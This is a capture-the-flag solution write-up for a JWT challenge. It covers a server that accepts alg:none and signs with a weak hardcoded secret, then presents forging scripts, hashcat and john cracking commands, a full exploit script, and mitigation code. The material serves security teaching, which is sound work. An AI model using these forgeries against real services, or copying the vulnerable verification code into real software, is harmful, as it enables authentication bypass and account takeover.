# Challenge 23: JWTForge — Solution

## Vulnerability Type
**JWT Algorithm Confusion (alg:none bypass)**  
*Bonus: Weak HMAC secret — brute-forceable*

## Description
The server issues a JWT with `role: "user"`. The `/flag` endpoint requires `role: "admin"`. Two independent vulnerabilities allow bypassing this check:

1. **Algorithm Confusion**: The server accepts `alg: "none"` — no signature is verified, so anyone can craft a token with any payload.
2. **Weak Secret**: The HMAC-SHA256 secret is `"supersecret"` — trivially found in common wordlists.

## Vulnerable Code

```python
# verify_token() — accepts alg:none without checking signature
alg = header.get("alg", "")
if alg == "none":
    return payload, None   # ← returns payload with zero verification!

# create_token() — uses a weak hardcoded secret
JWT_SECRET = "supersecret"
```

## Exploitation

### Method 1 — Algorithm None Bypass (No cracking needed)

A JWT has three parts: `header.payload.signature` (each base64url-encoded).

**Step 1**: Decode the guest token you get on the homepage.

```python
import base64, json

token = "<paste token from />"
parts = token.split(".")

def b64d(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

header  = json.loads(b64d(parts[0]))
payload = json.loads(b64d(parts[1]))
print(header)   # {"alg": "HS256", "typ": "JWT"}
print(payload)  # {"sub": "guest", "role": "user", "iat": 1700000000}
```

**Step 2**: Craft a forged admin token with `alg: none`.

```python
import base64, json

def b64e(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1700000000}

h = b64e(json.dumps(header, separators=(",", ":")))
p = b64e(json.dumps(payload, separators=(",", ":")))

forged = f"{h}.{p}."  # empty signature
print(forged)
```

**Step 3**: Send to `/flag`.

```bash
curl http://<host>:5000/flag \
  -H "Authorization: Bearer <forged_token>"
```

### Method 2 — Crack the Secret with Hashcat/John

```bash
# Save the original token to a file
echo "<token>" > jwt.txt

# Crack with hashcat (mode 16500 = JWT HS256)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Or with john
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
# → supersecret
```

Then forge a valid HS256 admin token:

```python
import base64, json, hmac, hashlib

SECRET = "supersecret"

def b64e(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header  = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1700000000}

h = b64e(json.dumps(header, separators=(",", ":")))
p = b64e(json.dumps(payload, separators=(",", ":")))

sig_input = f"{h}.{p}".encode()
sig = hmac.new(SECRET.encode(), sig_input, hashlib.sha256).digest()

token = f"{h}.{p}.{b64e(sig)}"
print(token)
```

## Complete Exploit Script (Method 1)

```python
import requests, base64, json

TARGET = "http://<host>:5000"

def b64e(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Forge alg:none admin token
header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1700000000}
h = b64e(json.dumps(header, separators=(",", ":")))
p = b64e(json.dumps(payload, separators=(",", ":")))
forged = f"{h}.{p}."

print(f"[*] Forged token: {forged}")

r = requests.get(f"{TARGET}/flag", headers={"Authorization": f"Bearer {forged}"})
data = r.json()
print(f"[+] Response: {data}")
if "flag" in data:
    print(f"[+] Flag: {data['flag']}")
```

## Mitigation

```python
# 1. Reject alg:none entirely
ALLOWED_ALGORITHMS = {"HS256"}

def verify_token(token):
    header = json.loads(b64url_decode(token.split(".")[0]))
    if header.get("alg") not in ALLOWED_ALGORITHMS:
        return None, "Algorithm not allowed"
    # ... rest of verification

# 2. Use a cryptographically random secret (min 32 bytes)
import secrets
JWT_SECRET = secrets.token_hex(32)   # store in env var, never hardcode

# 3. Prefer a well-tested library
import jwt as pyjwt

def verify_token(token):
    return pyjwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```

## Attack Diagram

```
Server issues:  {"alg":"HS256"}.{"role":"user"}.HMAC_SIGNATURE

Attacker changes:
  header  → {"alg":"none"}
  payload → {"role":"admin"}
  sig     → "" (empty)

Server checks:
  alg == "none" → skip signature check ✓
  payload["role"] == "admin" → return FLAG ✓
```

## Learning Points
- **Never accept `alg:none`** — this was an actual CVE (CVE-2015-9235) in many JWT libraries
- Always use a strong random secret (≥256 bits) generated at deploy time
- Use a battle-tested library (`python-jose`, `PyJWT`) with explicit algorithm allowlists
- Consider RS256 (asymmetric) for multi-service architectures

## References
- [CVE-2015-9235 — JWT none algorithm](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 8725 — JWT Best Practices](https://tools.ietf.org/html/rfc8725)
